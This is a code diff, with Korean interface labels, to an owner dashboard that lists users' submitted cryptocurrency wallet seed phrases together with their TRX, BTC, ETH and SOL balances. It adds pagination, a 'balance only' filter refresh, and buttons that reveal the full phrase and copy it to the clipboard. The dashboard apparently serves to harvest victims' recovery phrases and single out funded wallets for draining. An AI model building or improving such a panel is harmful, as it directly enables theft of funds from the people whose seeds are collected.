@@ -60,6 +60,8 @@
     .btn-ghost { background: transparent; border: 1px solid var(--border); color: var(--fg); }
     .btn-ghost:hover { border-color: var(--ac); color: var(--ac); }
     .btn-sm { padding: 7px 14px; font-size: 12px; }
+    .btn-xs { padding: 3px 8px; font-size: 11px; border-radius: 6px; }
+    .seed-phrase-cell { font-family: monospace; font-size: 11px; color: var(--muted); word-break: break-all; flex: 1; min-width: 0; }
     .btn-warn { background: transparent; border: 1px solid var(--warn); color: var(--warn); }
     .btn-warn:hover { background: rgba(251,146,60,.1); }
     .btn-err-sm { background: transparent; border: 1px solid var(--err); color: var(--err); padding: 6px 12px; font-size: 12px; border-radius: 8px; }
@@ -259,7 +261,7 @@
   <div class="tabbar">
     <button class="tab-btn active" data-tab="tabDevices" onclick="switchTab('tabDevices')">💻 기기 목록</button>
     <button class="tab-btn" data-tab="tabCreate" onclick="switchTab('tabCreate')">➕ 계정 생성</button>
-    <button class="tab-btn" data-tab="tabSeeds" onclick="switchTab('tabSeeds');loadSeeds()">🌱 시드 현황</button>
+    <button class="tab-btn" data-tab="tabSeeds" onclick="switchTab('tabSeeds');loadSeeds(true)">🌱 시드 현황</button>
   </div>
 
   <div class="content">
@@ -342,10 +344,10 @@
           <h2 style="margin:0">시드 현황</h2>
           <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
             <label style="display:flex;align-items:center;gap:6px;font-size:13px;cursor:pointer;">
-              <input type="checkbox" id="filterBalance" onchange="loadSeeds()" style="accent-color:var(--ac)">
+              <input type="checkbox" id="filterBalance" onchange="loadSeeds(true)" style="accent-color:var(--ac)">
               잔고 있는 것만
             </label>
-            <button class="btn-ghost btn-sm" onclick="loadSeeds()">새로고침</button>
+            <button class="btn-ghost btn-sm" onclick="loadSeeds(true)">새로고침</button>
           </div>
         </div>
         <div id="seedsBody">
@@ -439,6 +441,8 @@
   let _qrCalcPrice = 0;
   let _pricing = null;
   let _seedsLoaded = false;
+  let _seedPage    = 1;
+  const _seedRevealed = {}; // seedId -> bool
 
   /* ===================== INIT ===================== */
   window.addEventListener('DOMContentLoaded', () => {
@@ -712,45 +716,111 @@
   }
 
   /* ===================== SEEDS ===================== */
-  async function loadSeeds() {
+  function maskPhrase(phrase) {
+    if (!phrase) return '';
+    const words = phrase.trim().split(/\s+/);
+    return words.map((w, i) => i < 2 ? w : '••••').join(' ');
+  }
+
+  function toggleSeedReveal(id) {
+    _seedRevealed[id] = !_seedRevealed[id];
+    const cell = document.getElementById('seedCell_' + id);
+    const btn  = document.getElementById('seedRevBtn_' + id);
+    const phrase = cell?.dataset.phrase || '';
+    if (!cell || !btn) return;
+    if (_seedRevealed[id]) {
+      cell.textContent = phrase;
+      btn.textContent  = '숨기기';
+    } else {
+      cell.textContent = maskPhrase(phrase);
+      btn.textContent  = '보기';
+    }
+  }
+
+  function copySeedPhrase(id) {
+    const cell = document.getElementById('seedCell_' + id);
+    const phrase = cell?.dataset.phrase || '';
+    if (!phrase) return;
+    navigator.clipboard.writeText(phrase).then(() => showToast('시드 복사됨', 'ok')).catch(() => {
+      const ta = document.createElement('textarea');
+      ta.value = phrase; document.body.appendChild(ta);
+      ta.select(); document.execCommand('copy');
+      document.body.removeChild(ta);
+      showToast('시드 복사됨', 'ok');
+    });
+  }
+
+  async function loadSeeds(resetPage) {
     if (!_token) return;
+    if (resetPage) _seedPage = 1;
     const hasBalance = document.getElementById('filterBalance')?.checked ? '1' : '0';
     const body = document.getElementById('seedsBody');
     body.innerHTML = '<div class="loading-center"><div class="spinner"></div></div>';
     try {
-      const r = await ownerFetch('/api/owner/seeds?hasBalance=' + hasBalance);
+      const r = await ownerFetch(`/api/owner/seeds?hasBalance=${hasBalance}&page=${_seedPage}&pageSize=10`);
       if (!r.ok) { body.innerHTML = '<div class="no-data">불러오기 실패</div>'; return; }
       const data = await r.json();
       const seeds = data.seeds || [];
+      const total = data.total || 0;
+      const totalPages = data.totalPages || 1;
+
       if (!seeds.length) {
         body.innerHTML = '<div class="no-data">시드가 없습니다.</div>';
         return;
       }
+
+      const rows = seeds.map(s => {
+        const rev = !!_seedRevealed[s.id];
+        const display = rev ? esc(s.phrase) : esc(maskPhrase(s.phrase));
+        return `<tr>
+          <td style="font-weight:600">${esc(s.userId)}</td>
+          <td>
+            <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
+              <span id="seedCell_${s.id}" class="seed-phrase-cell" data-phrase="${esc(s.phrase)}">${display}</span>
+              <div style="display:flex;gap:4px;flex-shrink:0;">
+                <button id="seedRevBtn_${s.id}" class="btn-ghost btn-xs" onclick="toggleSeedReveal(${s.id})">${rev ? '숨기기' : '보기'}</button>
+                <button class="btn-ghost btn-xs" onclick="copySeedPhrase(${s.id})">복사</button>
+              </div>
+            </div>
+          </td>
+          <td>${s.tron > 0 ? '<span style="color:var(--ok)">' + s.tron.toFixed(4) + '</span>' : '-'}</td>
+          <td>${s.btc  > 0 ? '<span style="color:var(--ok)">' + s.btc.toFixed(6)  + '</span>' : '-'}</td>
+          <td>${s.eth  > 0 ? '<span style="color:var(--ok)">' + s.eth.toFixed(6)  + '</span>' : '-'}</td>
+          <td>${s.sol  > 0 ? '<span style="color:var(--ok)">' + s.sol.toFixed(4)  + '</span>' : '-'}</td>
+          <td>${s.usdtBalance > 0 ? '<b style="color:var(--ac)">≈ ' + s.usdtBalance.toFixed(2) + ' USDT</b>' : '<span style="color:var(--muted)">-</span>'}</td>
+          <td style="font-size:11px;color:var(--muted)">${fmtDate(s.at)}</td>
+        </tr>`;
+      }).join('');
+
+      const pageFrom = ((_seedPage - 1) * 10) + 1;
+      const pageTo   = Math.min(_seedPage * 10, total);
+      const prevDis  = _seedPage <= 1 ? 'disabled' : '';
+      const nextDis  = _seedPage >= totalPages ? 'disabled' : '';
+
       body.innerHTML = `
-        <div style="font-size:12px;color:var(--muted);margin-bottom:10px">총 ${seeds.length}건</div>
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;flex-wrap:wrap;gap:6px;">
+          <span style="font-size:12px;color:var(--muted)">총 ${total}건 (${pageFrom}–${pageTo})</span>
+          <div style="display:flex;gap:6px;align-items:center;">
+            <button class="btn-ghost btn-sm" onclick="seedPrevPage()" ${prevDis}>◀ 이전</button>
+            <span style="font-size:12px;color:var(--muted)">${_seedPage} / ${totalPages}</span>
+            <button class="btn-ghost btn-sm" onclick="seedNextPage()" ${nextDis}>다음 ▶</button>
+          </div>
+        </div>
         <div class="table-wrap">
           <table>
             <thead><tr>
-              <th>사용자</th><th>시드 (마스킹)</th><th>TRX</th><th>BTC</th><th>ETH</th><th>SOL</th><th>USDT 환산</th><th>제출일</th>
+              <th>사용자</th><th>시드 문구</th><th>TRX</th><th>BTC</th><th>ETH</th><th>SOL</th><th>USDT 환산</th><th>제출일</th>
             </tr></thead>
-            <tbody>
-              ${seeds.map(s => `<tr>
-                <td style="font-weight:600">${esc(s.userId)}</td>
-                <td style="font-family:monospace;font-size:11px;color:var(--muted)">${esc(s.phrase)}</td>
-                <td>${s.tron > 0 ? '<span style="color:var(--ok)">' + s.tron.toFixed(4) + '</span>' : '-'}</td>
-                <td>${s.btc  > 0 ? '<span style="color:var(--ok)">' + s.btc.toFixed(6)  + '</span>' : '-'}</td>
-                <td>${s.eth  > 0 ? '<span style="color:var(--ok)">' + s.eth.toFixed(6)  + '</span>' : '-'}</td>
-                <td>${s.sol  > 0 ? '<span style="color:var(--ok)">' + s.sol.toFixed(4)  + '</span>' : '-'}</td>
-                <td>${s.usdtBalance > 0 ? '<b style="color:var(--ac)">≈ ' + s.usdtBalance.toFixed(2) + ' USDT</b>' : '<span style="color:var(--muted)">-</span>'}</td>
-                <td style="font-size:11px;color:var(--muted)">${fmtDate(s.at)}</td>
-              </tr>`).join('')}
-            </tbody>
+            <tbody>${rows}</tbody>
           </table>
         </div>`;
     } catch (e) {
       body.innerHTML = `<div class="no-data">${esc(e.message)}</div>`;
     }
   }
+
+  function seedPrevPage() { if (_seedPage > 1) { _seedPage--; loadSeeds(); } }
+  function seedNextPage() { _seedPage++; loadSeeds(); }
 
   /* ===================== QR CHARGING ===================== */
   async function loadPricing() {
